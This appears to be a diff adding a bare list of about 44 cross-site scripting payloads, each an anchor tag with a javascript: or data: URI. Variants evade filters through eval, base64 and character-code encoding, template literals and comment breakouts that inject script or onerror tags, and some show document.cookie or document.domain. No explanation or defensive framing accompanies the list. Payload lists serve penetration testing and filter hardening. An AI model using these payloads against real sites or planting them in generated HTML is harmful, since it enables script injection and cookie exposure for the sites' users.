@@ -1,0 +1,44 @@
+<a href="javascript:alert(1)">ClickMe</a>
+<a href="javascript:void(alert(1))">ClickMe</a>
+<a href="javascript:prompt(1)">ClickMe</a>
+<a href="javascript:confirm(1)">ClickMe</a>
+<a href="javascript:setTimeout('alert(1)',0)">ClickMe</a>
+<a href="javascript:new Function('alert(1)')()">ClickMe</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">ClickMe</a>
+<a href="javascript:eval(atob('YWxlcnQoMSk='))">ClickMe</a>
+<a href="javascript:eval('alert(1)')">ClickMe</a>
+<a href="javascript:window ">ClickMe</a>
+<a href="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))">ClickMe</a>
+<a href="javascript:eval`alert(1)`">ClickMe</a>
+<a href="javascript:confirm(document.domain)">ClickMe</a>
+<a href="javascript:prompt(document.cookie)">ClickMe</a>
+<a href="javascript:alert(document.location)">ClickMe</a>
+<a href="javascript:eval('prompt(1)')">ClickMe</a>
+<a href="javascript:eval('confirm(1)')">ClickMe</a>
+<a href="javascript:eval('alert(1)')">ClickMe</a>
+<a href="javascript:eval('alert(document.domain)')">ClickMe</a>
+<a href="javascript:eval('prompt(document.domain)')">ClickMe</a>
+<a href="javascript:eval('confirm(document.cookie)')">ClickMe</a>
+<a href="javascript:eval(String.raw`alert(1)`);">ClickMe</a>
+<a href="javascript:eval(String.raw`prompt(1)`);">ClickMe</a>
+<a href="javascript:eval(String.raw`confirm(1)`);">ClickMe</a>
+<a href="javascript:eval(decodeURIComponent('%61%6C%65%72%74(1)'))">ClickMe</a>
+<a href="javascript:eval(unescape('%61%6C%65%72%74(1)'))">ClickMe</a>
+<a href="javascript:alert(1)//">ClickMe</a>
+<a href="javascript:alert(1)/*">ClickMe</a>
+<a href="javascript://alert(1)">ClickMe</a>
+<a href="javascript:/*--><script>alert(1)</script>">ClickMe</a>
+<a href="javascript:/*--><img src=x onerror=alert(1)>">ClickMe</a>
+<a href="javascript:confirm(1)">ClickMe</a>
+<a href="javascript:prompt(1)">ClickMe</a>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">ClickMe</a>
+<a href="javascript:alert('XSS')">ClickMe</a>
+<a href="javascript:eval('alert(document.domain)')">ClickMe</a>
+<a href="javascript:eval('prompt(document.cookie)')">ClickMe</a>
+<a href="javascript:eval('confirm(document.location)')">ClickMe</a>
+<a href="javascript:eval('alert(navigator.userAgent)')">ClickMe</a>
+<a href="javascript:eval('alert(window.location)')">ClickMe</a>
+<a href="javascript:eval('alert(document.referrer)')">ClickMe</a>
+<a href="javascript:eval('alert(document.title)')">ClickMe</a>
+<a href="javascript:eval('alert(document.domain)')">ClickMe</a>
+<a href="javascript:eval('alert(document.cookie)')">ClickMe</a>
